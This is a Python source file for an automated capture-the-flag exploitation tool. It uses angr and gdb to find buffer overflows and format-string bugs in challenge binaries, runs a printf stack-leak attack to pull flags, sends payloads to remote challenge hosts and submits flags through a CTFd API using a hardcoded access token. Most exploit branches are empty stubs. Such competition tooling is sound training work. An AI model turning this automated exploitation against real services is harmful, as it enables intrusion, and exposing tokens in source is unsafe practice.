import os, subprocess, sys
from multiprocessing import Process
import angr, claripy#, angrop
import ropgadget
import json, requests
from colorama import Fore, Back, Style
from pwn import *

# This helps debugging to shutup pwntools
context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)

# Access token for team to make api calls -- CHANGE THIS
access_token = "ctfd_489823be103a92f08ed1e04953ac1891cd84424d401789f475236eaf33db165d"

# URL of ctfd --
ctfd_url = "https://ace.ctfd.io"

# Headers needed for api calls
headers = {
    "Authorization": f"Token {access_token}",
    "Content-Type" : "application/json",
}

UR_MOM_LOL = 4096

# Regex to help find flags in recvall
flag_pattern = r'flag\{[^}]+\}'

# ------------------------------------------------- #
# This is where your auto exploit code should be    #
# placed. This should craft the exploit locally to  #
# get the fake flag, send the exploit to the remote #
# binary, receive the flag, and submit the flag     #
# ------------------------------------------------- #


class SHART:
    def __init__(self, filename:str, chal_id:int) -> None:
        self.file = filename
        self.chal_id = chal_id
        
        self.libc_path = "/opt/libc.so.6"
        self.ld_path = "/opt/ld-2.27.so"
        
        self.bin = context.binary = ELF(filename)
        self.libc = context.binary = ELF(self.libc_path)
        
        self.rop = ROP(self.bin)
        
        self.has_leak = False
        self.has_overflow = False
        
        self.angrBuffer = None
        self.buffer = None
        self.payload = None # might change this to a list of payloads.
        
        # self.angrProj = angr.Project(filename, load_options={"auto_load_libs":False})
        # self.angrCfg = self.angrProj.analyses.CFGFast()
        # self.angrFunc = self.angrCfg.kb.functions
        # self.angrSimgr = None
        
        self.recipe = {
                "ret2win":False,
                "ret2system":False,
                "ret2execve":False,
                "ret2syscall":False,
                "ret2libc":False,
                "ROPWritePrim":False,
                "FormStrStackLeak":False,
                "FormStrLibcLeak":False,
                "FormStrWritePrim":False,
                "FormStrGOTOver":False,
                "ArrayIndexAbuse":False
                }
        
        self.flag = None
        
    def __check_mem_corruption(self, simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    temp_buffer = path.solver.eval(self.angrBuffer, cast_to=bytes)
                    try:
                        ind = temp_buffer.index(b"AAAAAAAA")
                        self.buffer = temp_buffer[:ind]
                        simgr.stashes["corrupt"].append(path)
                    except Exception as e:
                        print(f"{self.file}: Angr failed to find index!")
                        # print(temp_buffer)
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")
        
    def __init_angr(self):
        
        print(Fore.RED + Style.BRIGHT + f"Analyzing {self.file}: Initializing Angr." + Style.RESET_ALL)
        
        angrProj = angr.Project(self.file, load_options={"auto_load_libs":False})
        
        inp_size = 500
        
        self.angrBuffer = claripy.BVS("input", 8 * inp_size)
                
        state = angrProj.factory.entry_state(addr=self.bin.sym["main"], stdin=self.angrBuffer)#, add_options=angr.options.unicorn)
        angrSimgr = angrProj.factory.simgr(state, save_unconstrained=True)
        angrSimgr.stashes["corrupt"] = []
        
        # def is_leakable(state):
        #     pointer = state.solver.eval(state.regs.rdi)
        #     if pointer >= 0xffffffffff:
        #         self.has_leak = True
        
        def prevent_death(state):
            read_size = state.solver.eval(state.regs.rsi)
            if read_size >= UR_MOM_LOL:
                angrSimgr.drop(stash = "active")
                
        angrProj.hook_symbol("fgets", prevent_death)
        # angrProj.hook_symbol("printf", is_leakable)
        
        print(Fore.GREEN + Style.BRIGHT + f"Analyzing {self.file}: Simulation Active." + Style.RESET_ALL)
        
        angrSimgr.explore(step_func=self.__check_mem_corruption)
        
        print(Fore.GREEN + Style.BRIGHT + f"Analyzing {self.file}: Simulation Completed." + Style.RESET_ALL)
        
        for error in angrSimgr.errored:
            if str(error.error) == "Symbolic (format) string, game over :(":
                self.has_leak = True
        
        if len(angrSimgr.stashes["corrupt"]) == 0:
            print(Fore.YELLOW + Style.BRIGHT + f"Analyzing {self.file}: Angr Failed to Find Overflow." + Style.RESET_ALL)
        else:
            self.has_overflow = True
        angrSimgr = None
        angrProj = None
        
    def __gdb_overflow(self):
        print(Fore.YELLOW + Style.BRIGHT + f"Analyzing {self.file}: GDB Fallback." + Style.RESET_ALL)
        
        # Thanks Louis! https://github.com/condor0010
        
        context.log_level = 'critical'
        content_to_write = "file "+self.file+"\nrun <<< " + cyclic(2048).decode("utf-8") + "\nprint $rbp"
        file_name = str(random.randint(0,9999999999))+".gdb"
        with open(file_name, 'w') as file: file.write(content_to_write)
        out = subprocess.run(["gdb", "-x", file_name, "-batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        try:
            size = cyclic_find(p64(int(out.strip().split(' ')[-1],16)))
            if size > 0:
                size+=8
        except ValueError as e:
            size = 0
        os.remove(file_name)
        if size <= 0:
            print(Fore.MAGENTA + Style.BRIGHT + Back.YELLOW + f"Analyzing {self.file}: Overflow Not Successfull!" + Style.RESET_ALL)
        else:
            self.has_overflow = True
            self.buffer = b"A" * size
                        
    # Search for string in binary and return the address.
    def __find_string(self, string:str) -> int:
        out = subprocess.check_output(["ropper", "-f", self.file, "--string", string, "--nocolor"]).decode("ascii")
        addr = out.split("\n")[7].split()[0]
        ret = 0
        if "0x" in addr:
            ret = int(addr, 16)
        return ret
    
    # Gets flag out of stack.
    def __get_printf_stack_leak(self) -> str:
        start = 0
        for i in range(1, 0x21):
            p = process(self.file)
            p.recvuntil(b">>>")
            p.sendline(b"%%%d$p"%i)
            output = p.recvall(timeout=0.5)
            p.close()
            if b"67616c66" in output:
                start = i
                break
        flag = ""
        p = process(self.file)
        p.recvuntil(b">>>")
        p.sendline(b"%%%d$p%%%d$p"%(start, start+1))
        temp = p.recvline().strip().decode("ascii")
        temp = temp[temp.index("0x"):]
        nums = temp.split("0x")
        for part in nums:
            temp = re.findall("..", part)[::-1]
            for num in temp:
                flag += chr(int(num, 16))
                if "7d" in num:
                    break
        return flag
        
        
        
    def send_flag(self):
        challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"
        data = json.dumps({"challenge_id" : self.chal_id, "submission" : self.flag})
        response = requests.post(challenge_url, headers=headers, data=data)

    def send_exploit(self):
        url = f"ace-service-{self.file}.chals.io"
        p = remote(url, 443, ssl=True, sni=url)
        p.recvuntil(">>>\n")     # Should all be the same (this will be clarified)
        p.sendline(self.payload)
        flag = re.findall(flag_pattern, p.recvall(timeout=0.5).decode())[0]
        if flag:
            self.send_flag()
        else:
            # This comment is for Curtice <3
            print(Fore.MAGENTA + Style.BRIGHT + Back.YELLOW + f"Sending {self.file}: Remote Payload Fail." + Style.RESET_ALL)

    def exploit(self):        
        
        # Given the recipe, the tool will try to exploit the binary in the fashion required by the type of exploit(s) detected
        
        print(Fore.CYAN + Style.BRIGHT + f"Exploiting {self.file}: Exploits Initiated" + Style.RESET_ALL)
        
        # You need to make functions to make your exploits easier to read/do. Make sure that the parameters are static like in the "runner" function.
        # self.buffer contains the buffer up before overwriting the return address.
        # self.payload must contain the pwning payload. 
        temp_flag = None
        
        if self.recipe["ret2win"]:
            # function here
            test = 0
        if self.recipe["ret2system"] and self.flag == None:
            # function here
            test = 0
        if self.recipe["ret2execve"] and self.flag == None:
            # function here
            test = 0
        if self.recipe["ret2syscall"] and self.flag == None:
            # function here
            test = 0
        if self.recipe["ret2libc"] and self.flag == None:
            # function here
            test = 0
        if self.recipe["ROPWritePrim"] and self.flag == None:
            # function here
            test = 0
        if self.recipe["FormStrStackLeak"] and self.flag == None:
            temp_flag = self.__get_printf_stack_leak()
        elif self.recipe["FormStrLibcLeak"] and self.flag == None:
            # function here
            test = 0
        elif self.recipe["FormStrWritePrim"] and self.flag == None:
            # function here
            test = 0
        elif self.recipe["FormStrGOTOver"] and self.flag == None:
            # function here
            test = 0
        if self.recipe["ArrayIndexAbuse"] and self.flag == None:
            # function here
            test = 0
            
        if temp_flag == "":
            temp_flag = None

        if temp_flag:
            print(f"Found flag {self.file}: {temp_flag}")
            # self.send_exploit()
        else:
            print(Fore.MAGENTA + Style.BRIGHT + Back.YELLOW + f"Exploiting {self.file}: No Exploit Landed. There Goes Our Streak." + Style.RESET_ALL)
        
    def analyze(self) -> None:
        
        # Overflow and printf leak detection.
        self.__init_angr()
        if self.buffer == None and not self.has_leak:
            # Backup overflow detection.
            self.__gdb_overflow()
            
        print(Fore.MAGENTA + f"{self.buffer}" + Style.RESET_ALL)
                            
        # Analyze possible attacks and mark the recipe.
        
        if self.has_leak:
            if self.has_overflow: # Detecting FS Libc Leak
                test = 0
            else:
                if "win" in self.bin.sym.keys() and "pwnme" in self.bin.sym.keys():
                    self.recipe["FormStrWritePrim"] = True
                elif "win" in self.bin.sym.keys():
                    self.recipe["FormStrGOTOver"] = True
                else:
                    self.recipe["FormStrStackLeak"] = True
        elif self.has_overflow:
            test = 0 # ROP Stuff
        else: 
            test = 0 # ArrayIndexAbuse

            
def execute(filename:str, chal_id:int):
    run = SHART(filename, chal_id)
    run.analyze()
    run.exploit()
    

if __name__ == "__main__":
    
    print("S.H.A.R.T Initializing . . .")
        

    # ----- Download Binary Repo ----- #
    while(1):
        try:
            subprocess.run("git clone https://github.com/tj-oconnor/ace-binaries.git", shell=True)
            os.chdir("ace-binaries/test-binaries") # CHANGE THIS EVENTUALLY
            break
        except Exception as e:
            print("Failed to clone git repo!")
    # -------------------------------- #


    # ----- Get the first chal id ---- #
    challenge_url = f"{ctfd_url}/api/v1/challenges"
    response = requests.get(challenge_url, headers=headers)
    json_data = json.loads(response.text).get("data", {})
    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
    # -------------------------------- #

    # ----- Main Execution Loop! ----- #  
    jobs = []
    filenames = os.listdir()
    for file in filenames:
        if file != "flag.txt" and file != "exploit.py":
            corrected = file.replace("_", "-")
            jobs.append(Process(target=execute, args=(file, challenge_list[corrected])))
            
    control = []
    for job in jobs:
        job.start()
        control.append(job)
        if len(control) == 10:
            kill = 0
            while kill != 10:
                cont = control.copy()
                for sub in cont:
                    if not job.is_alive():
                        control.remove(sub)
                        kill += 1
                        sub.join()
                sleep(1)
                    
    print("S.H.A.R.T Completed")    
